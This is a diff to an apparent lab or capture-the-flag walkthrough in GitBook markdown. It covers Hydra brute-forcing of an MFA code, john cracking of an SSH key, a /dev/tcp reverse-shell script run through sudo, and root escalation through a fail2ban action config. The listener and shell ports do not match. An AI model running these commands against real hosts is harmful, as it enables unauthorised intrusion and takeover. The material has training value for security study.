@@ -166,10 +166,6 @@ Password: violet
 python -c "with open('output.txt', 'w') as file: [file.write(f'{str(i).zfill(4)}\n') for i in range(10000)]"
 ```
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
-
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
-
 **Kali**
 
 ```
@@ -178,6 +174,7 @@ cd thc-hydra/
 ./configure
 make
 make install
+cd ..
 
 thc-hydra/hydra -l jason_test_account -P output.txt $VICTIM http-post-form "/console/mfa.php:code=^PASS^:H=Cookie: PHPSESSID=hshqcs3n42r9qjs5b2850r9alt; user=jason_test_account; pwd=violet:F=Incorrect code" -T 64
 ```
@@ -185,6 +182,128 @@ thc-hydra/hydra -l jason_test_account -P output.txt $VICTIM http-post-form "/con
 
 
 <figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (758).png" alt=""><figcaption></figcaption></figure>
+
+## LFI
+
+<figure><img src="../../.gitbook/assets/image (759).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+chmod 600
+/opt/john/ssh2john.py id_rsa > id_john.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt id_john.txt 
+```
+
+<figure><img src="../../.gitbook/assets/image (760).png" alt=""><figcaption></figcaption></figure>
+
+## TCP/22 - SSH
+
+**Kali**
+
+```
+ssh -i id_rsa jason@$VICTIM 
+Password: 1a2b3c4d
+```
+
+<figure><img src="../../.gitbook/assets/image (761).png" alt=""><figcaption></figcaption></figure>
+
+
+
+Lateral Movement
+
+**Victim**
+
+```
+sudo -l
+```
+
+<figure><img src="../../.gitbook/assets/image (762).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+echo '#!/bin/bash' > shell.sh
+echo 'sh -i >& /dev/tcp/$KALI/1337 0>&1' >> shell.sh
+```
+
+**Kali**
+
+```
+nc -lvnp 1338
+```
+
+**Victim**
+
+```
+sudo -u fred ./shell.sh
+```
+
+<figure><img src="../../.gitbook/assets/image (763).png" alt=""><figcaption></figcaption></figure>
+
+Get autocomplete
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+ctrl + Z
+stty raw -echo;fg
+```
+
+## Privilege Escalation&#x20;
+
+**Victim**
+
+```
+sudo -l
+```
+
+<figure><img src="../../.gitbook/assets/image (764).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+cat /etc/fail2ban/jail.conf
+```
+
+<figure><img src="../../.gitbook/assets/image (768).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+ls -la /etc/fail2ban/action.d/iptables-multiport.conf
+vi /etc/fail2ban/action.d/iptables-multiport.conf
+```
+
+<figure><img src="../../.gitbook/assets/image (765).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (770).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+sudo /bin/systemctl restart fail2ban
+```
+
+Now we need to enter bad passwords until we've triggerd the ban action
+
+**Kali**
+
+```
+ssh root@$VICTIM
+```
+
+<figure><img src="../../.gitbook/assets/image (769).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+/bin/bash -p
+whoami
+```
+
+<figure><img src="../../.gitbook/assets/image (771).png" alt=""><figcaption></figcaption></figure>
 
 
 
